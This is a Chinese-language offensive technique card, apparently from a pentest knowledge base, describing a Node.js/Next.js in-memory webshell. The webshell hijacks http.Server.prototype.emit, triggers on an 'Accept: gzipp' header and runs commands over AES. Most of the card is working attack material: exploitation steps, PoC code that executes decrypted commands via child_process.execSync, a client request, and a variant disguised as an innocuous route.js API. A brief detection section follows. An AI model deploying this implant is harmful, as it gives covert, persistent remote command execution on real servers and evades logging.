---
id: web-nodejs-http-server-emit-hijack-header-aes-memshell
title: Node.js HTTP Server.prototype.emit 劫持 + Accept 头路由 + AES 通道内存马/文件马
type: scenario
domain: web
path: web/nodejs
technique: nodejs-http-emit-hijack-header-aes-memshell
aliases:
- JsAesMemShell
- JsAesWebshell
- http.Server.prototype.emit 劫持
- Accept gzipp
- Header 路由 Webshell
- Next.js 内存马
- Node.js 无文件 Webshell
- AES-128-ECB 内存马
tags:
- nodejs
- nextjs
- memshell
- webshell
- http
- prototype
- header
- aes
- persistence
- post-exploitation
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V173
  verified_at: '2026-11-06T17:41:48+08:00'
  notes: 已通读全文（无图片）核对：http.Server.prototype.emit劫持+Accept gzipp路由、AES-128-ECB内存马(MD5(password+secret)[:16])、AES-128-CBC文件马(MD5(password)且key作IV)、(0,eval)动态Payload与global存储、route.js伪装均一致；原文无实际HTTP/命令回显，卡内confidence=medium已注明。跳过Next.js原型污染payload已确认由既有已验证卡web-nodejs-deserialization-react-flight-chunk-proto-function-rce完整覆盖
---

## 一句话结论

在已取得 Node.js 进程内代码执行后，可以重写 `http.Server.prototype.emit`：保存原始方法，拦截 `request` 事件并检查 `Accept` 头是否包含自定义标记 `gzipp`，命中则走 AES 加密的 Webshell 通道、直接 `res.end`，否则透传给原方法；由于改的是原型而非单个 server 实例，所有 HTTP 路径都能触发，日志里看不出固定后门路径，内存马不落盘、重启即失效。

## 原理

- **原型级劫持**：Node 的 `http.Server` 继承 `EventEmitter`，所有请求都会调用 `server.emit('request', req, res)`。`http.Server.prototype.emit` 是共享方法，替换它即可在任何路由/框架之前拦截全部 HTTP 请求；保存 `originalEmit` 并在未命中时 `apply` 回去，业务无感。
- **Header 路由**：不依赖固定 URL，而是检查 `req.headers['accept']` 是否包含 `gzipp`（故意拼错，伪装成 Accept-Encoding 的笔误）。命中后直接处理并 `return true`，阻止事件继续传播；因此 `/`、`/api/images`、`/user/profile` 等任意路径都能作为入口，访问日志只看到正常路径与 200。
- **AES 通道**：文件型 JsAesWebshell 用 `AES-128-CBC`：`key = MD5(password)`（16 字节），`IV = key`，PKCS5 填充，Base64 后放 JSON `{"data":"..."}`；内存型 JsAesMemShell 用 `AES-128-ECB`：`key = MD5(password+secret).substring(0,16)`，无 IV，支持 JSON/form-urlencoded/query 三种请求格式。
- **动态 Payload**：首次请求解密出 Payload 类源码，用 `(0, eval)(payloadCode + '\nglobal.Payload = Payload;')` 在全局作用域执行并存入 `global[payloadStoreName]`；后续请求从 global 取类、实例化、`formatParameter(decrypted)` 后 `run()`，结果 gzip + AES + Base64 返回。
- **文件型伪装**：把同样的 IIFE 放在 `app/api/images/route.js` 顶部，导出标准 `GET`/`POST` 返回 `{status:'registered', header:'Accept: gzipp'}` 伪装成正常 API；IIFE 在模块加载时执行劫持，实际命令通道仍走 header 识别。
- **为什么选择 ECB/CBC**：内存马注入代码越短越好，ECB 无 IV 简化密钥管理；文件型可用 CBC + key 作 IV（实现简单，但 IV 固定是弱点）。两者都用 MD5 派生密钥，安全性依赖 password/secret 强度。
- **边界**：这是“已 RCE 后的驻留/隐蔽通道”技术，不是初始入口；内存马重启即失效；原型劫持可能被其他中间件/监控覆盖；`gzipp` 头是可检测特征。

## 触发条件

- 攻击者已能在目标 Node 进程内执行任意 JavaScript（原型污染 RCE、表达式注入、依赖漏洞、已控后台等）。
- 目标运行 Node.js 18+ / Next.js 14.x（原文环境），进程内有对外 HTTP Server。
- 能在进程内 `import('node:http')` 并修改 `http.Server.prototype.emit`；无进程级完整性监控/热补丁阻止。
- 文件型模式还需能写 `app/api/.../route.js` 并让 Next.js 重新加载。
- 客户端与服务端共享 password/secret，且能发送自定义 `Accept` 头。

## 利用步骤

1. **确认进程与 HTTP 服务**：通过已有 RCE 执行 `process.version`、`process._getActiveHandles()`，确认 Node 进程与 HTTP Server。
2. **注入劫持代码**：保存 `const originalEmit = http.Server.prototype.emit;`，替换为检查 `req.headers.accept.includes('gzipp')` 的函数；命中走 handler，否则 `originalEmit.apply(this, arguments)`。
3. **实现 handler**：读取请求体（JSON/form/query 多格式），Base64 解码 → AES 解密 → 首次加载 Payload / 后续执行 → 结果 gzip → AES 加密 → Base64 → JSON 响应。
4. **客户端**：用相同 password/secret 派生 key，AES 加密命令（Godzilla 格式），POST 到任意路径并带 `Accept: gzipp`，解析 JSON `data` 解密。
5. **文件型部署（可选）**：把 IIFE 放入 `app/api/images/route.js`，导出伪装的 GET/POST；访问该 API 返回 `registered` 表示加载成功。
6. **验证与清理**：执行 `id`/`whoami` 确认通道；内存马需重启进程清除，文件马需删除 route.js 并重新构建。

## PoC

服务端核心（示意）：

```javascript
const http = require('http');
const crypto = require('crypto');
const zlib = require('zlib');
const cp = require('child_process');

const password = 'user_password';
const key = crypto.createHash('md5').update(password).digest(); // 16 bytes
const iv = key;

function decrypt(buf) {
  const d = crypto.createDecipheriv('aes-128-cbc', key, iv);
  return Buffer.concat([d.update(buf), d.final()]);
}
function encrypt(buf) {
  const c = crypto.createCipheriv('aes-128-cbc', key, iv);
  return Buffer.concat([c.update(buf), c.final()]);
}

const originalEmit = http.Server.prototype.emit;
http.Server.prototype.emit = function (event, ...args) {
  if (event === 'request') {
    const [req, res] = args;
    const accept = (req.headers['accept'] || '').toLowerCase();
    if (accept.includes('gzipp')) {
      let body = '';
      req.on('data', c => body += c);
      req.on('end', () => {
        const data = JSON.parse(body).data;
        const cmd = decrypt(Buffer.from(data, 'base64')).toString();
        const out = cp.execSync(cmd);
        res.writeHead(200, {'Content-Type': 'application/json'});
        res.end(JSON.stringify({data: encrypt(zlib.gzipSync(out)).toString('base64')}));
      });
      return true;
    }
  }
  return originalEmit.apply(this, arguments);
};
```

客户端请求：

```http
POST /any/path HTTP/1.1
Host: target
Accept: image/avif,image/webp,*/*;q=0.8
Accept: gzipp
Content-Type: application/json

{"data":"<base64(AES-CBC(cmd))>"}
```

文件型伪装 route：

```javascript
// app/api/images/route.js
import { NextResponse } from 'next/server';
// ... 上面的 IIFE 劫持代码 ...
export async function POST() {
  return NextResponse.json({status: 'registered', header: 'Accept: gzipp'});
}
export async function GET() { return POST(); }
```

原文未给出实际命令回显/HTTP 截图，代码为工具实现描述，故 confidence=medium；使用前需在授权环境验证版本兼容与中间件行为。

## 变体与关联

- 变体：劫持 `server._events.request`（实例级，见关联卡）而非原型；用其他 header（`X-Forwarded-For`、`User-Agent`）或 cookie 做标记；AES-GCM/RC4/自定义 XOR；Payload 存 `global`/`process`/闭包；文件型伪装成 `route.js`、middleware、server component。
- 关联：[[web-nodejs-express-request-listener-memshell]]（`server._events.request` 实例级劫持 + RC4 通道）、[[web-nodejs-deserialization-react-flight-chunk-proto-function-rce]]（Next.js/React Flight 原型链 RCE，可作为本卡的注入入口）、[[web-nodejs-deserialization-nextjs-cve-2025-55183-rsc-reflect-adapter-chain]]（另一条 Next.js RSC RCE 链）。
- 同源：原文的 JsAesMemShell/JsAesWebshell 工具同时提供内存型与文件型两种模式。

## 检测与防御

- **完整性监控**：定期校验 `http.Server.prototype.emit`、`server._events.request` 是否为原生/框架函数；Node 进程内可用的 APM/EDR 钩子可检测原型方法被替换。
- **Header 异常**：告警 `Accept` 中出现 `gzipp` 等非标准标记、同一客户端用多个路径携带相同异常 header、JSON `{"data":"base64"}` 的加密 POST 到任意路径。
- **流量特征**：AES-CBC/ECB + Base64 + JSON 的命令通道有明显高熵 body；对无业务意义的路径返回 200 JSON 做审计。
- **持久化**：内存马重启即失效；文件马检查 `app/api/**/route.js` 是否含 IIFE/`http.Server.prototype.emit`/`child_process`；构建产物完整性校验。
- **权限**：Node 进程以低权限运行，禁用不必要的 `child_process`（Node permission model）；WAF 对 `__proto__`/`constructor`/`$B` 等 Flight 特征与异常 Accept 头拦截。
